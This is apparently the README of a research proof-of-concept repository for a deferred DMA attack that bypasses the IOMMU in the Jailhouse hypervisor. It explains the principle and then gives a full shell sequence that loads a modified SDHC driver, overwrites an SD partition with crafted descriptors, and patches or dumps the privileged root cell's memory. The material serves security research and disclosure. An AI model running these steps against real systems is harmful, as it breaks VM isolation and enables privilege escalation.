## Deferred DMA attack bypassing the IOMMU in dynamic hypervisors

#### Organization:

- **test_env/**: Configs and steps for building an environment for testing the attack (based on Jailhouse hypervisor). The environment targets <u>Zynq UltraScale+ MPSoCs (ZCU104)</u> platforms. For more information for building the environment in which the attack was achieved refers to **test_env/build_env.md**. 
- **sdhci.c/**: Modified SDHC driver used to carry out the attack (run in the attacking VM that controls the SDHC).
- **hw_debug/**: Hardware debugger scripts for debugging Jailhouse hypervisor and the VMs (OS awareness & Hypervisor awareness). These scripts are to be used with Trace32 and a Lauterbach PowerDebug PRO JTAG hardware debugger. The scripts are used to observe the SDHC control registers, MMU and SMMU page tables and confirm the effectiveness of the attack. Yet, the use of the hardware debugger is not essential for verifying the success of the attack, although it facilitates this.
- **demos/**: Demonstration videos of the attack. Each step of the attack is shown (and explained on two of these demos). The success of the attack is demonstrated by crashing the root cell and through a view of the root cell memory via the hardware debugger.


#### Principle of the attack

In some hypervisors, DMA-capable devices can be  remapped to the memory of another entity, particularly the host  hypervisor or a privileged VM. This can happen, for instance, if the VM  that controlled the DMA-capable device is destroyed. In that case, the DMA-capable device is unmapped from the memory of the VM and may be remapped to the memory of another VM or the host hypervisor. A device driver running in a VM could introduce a  substantial delay between the time it sends a command to the device and  the time when the device performs DMA. This delay can be exploited by a  malicious VM to instruct the device to perform a DMA operation **after the device has been remapped to the host  hypervisor or a privileged VM through the IOMMU.** As a  result, the attack enables a malicious VM, by leveraging the DMA  capabilities of one of its assigned I/O devices, to bypass the access  control ensured by the IOMMU and break the isolation provided by the hypervisor.

### Implementation of the attack 

---

This repository contains an implementation of the attack using a DMA-capable SD Host Controller used to access a SD card. It contains the modified SDHC driver used to carry out the attack. This repository also contains all artifacts and building steps for building Jailhouse hypervisor and the VMs, providing a suitable environment for testing the attack on a Zynq UltraScale+ MPSoCs (ZCU104) platform. In this environment an unrpivileged VM (cell) has direct access to a SD card through a SDHC. With the modified SDHC driver, it leverages the SDHC to carry out the described DMA attacks and patch the privileged VM (root cell) form which the hypervisor is controlled. 

**Typical attack scenario:**

1. The malicious VM sends a command to the SDHC with its modified SDHC driver

2. The delayed is introduced and the SDHC will perform the malicious DMA operation after some time (seconds, minutes...)

3. Meanwhile, the malicious VM is destroyed and the SDHC is remapped to the privileged VM (root cell)

4. The SDHC finally performs the malicious DMA operations which succeeds as the device was remapped to the privileged VM (root cell) memory 

   *NB: If the malicious was not destroyed, it can stops the SDHC and sends the command again*

The attack has been tested on Jailhouse but may be applicable on other dynamic hypervisor depending mainly on the above requirements:

**Requirements for attack applicability with an SDHC:** 

- 1:1 mapping of the SDHC memory through the IOMMU/SMMU (IOVA=PA)
- The SDHC can be dynamically remapped from the attacking VM to a targeted VM or entity (e.g, host, hypervisor...)

For more information regarding the applicability of the attack, please refers to the related article "*Deferred DMA Attack: A Threat for Bypassing the IOMMU in Dynamic Hypervisor*"

### Attack steps in the VM

----

```bash
#Insert the modified SDHC driver
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci.ko
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci-pltfm.ko
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci-of-arasan.ko

#Create a file that contains the target memory region in the root cell's memory to be dumped/patched
#Ex: \x23\x00\x22\x11\xdd\xcc\xbb\xaa to patch 0x1122 bytes at address 0xaabbccdd)
echo -n -e '\x23\x00\x16\x10\x00\x00\x21\x00'  > target

#Create a file that contains your payload (for patching the root cell's)
echo -n -e INSERT_YOUR_PAYLOAD_1234 > payload

#Request a descriptor table (of a size of 512 pages in that case) and print the physical address of the descriptor table
echo -n -e '512'  > /sys/devices/platform/ff170000.mmc/request_desc_table

#Prepare a partition on the SD card for the attack. /dev/mmcblk0p2 must be adapted to your case
#The address field of the descriptor (i.e., \x00\x00\xb0\x54 in the command below) must be replaced with the address given by request_desc_table. In that case the address given was 0x54b00000

perl -e    '$count=1024; while ($count>0) {
      syswrite(STDOUT, "\x25\x00\x08\x00\x00\x00\xb0\x54",  8);
      $count--;
    }' > /dev/mmcblk0p2

#Copy the malicious DMA instruction to SD card (seek=Number of loop on the descriptor table-1)
dd if=target of=/dev/mmcblk0p2 bs=8 seek=511 count=1 
#Copy the payload to SD card after the malicious buffer descriptor (seek=Number of loop on the descriptor table)
dd if=payload of=/dev/mmcblk0p2 bs=8 seek=512 count=1 

#Prepare the descriptor table in RAM for carrying out the attack
cat /sys/devices/platform/ff170000.mmc/enable_custom_adma
cat /sys/devices/platform/ff170000.mmc/construct_adma_attack

#Run the attack (if= for patching, of= for dumping RAM)
dd if=/dev/mmcblk0p2 bs=64k count=1M

#Then, the VM can be destroyed and the malicious DMA operation will be performed after some time depending on the chosen size of the descriptor table and the number of loop (seek) in the descriptor table
```

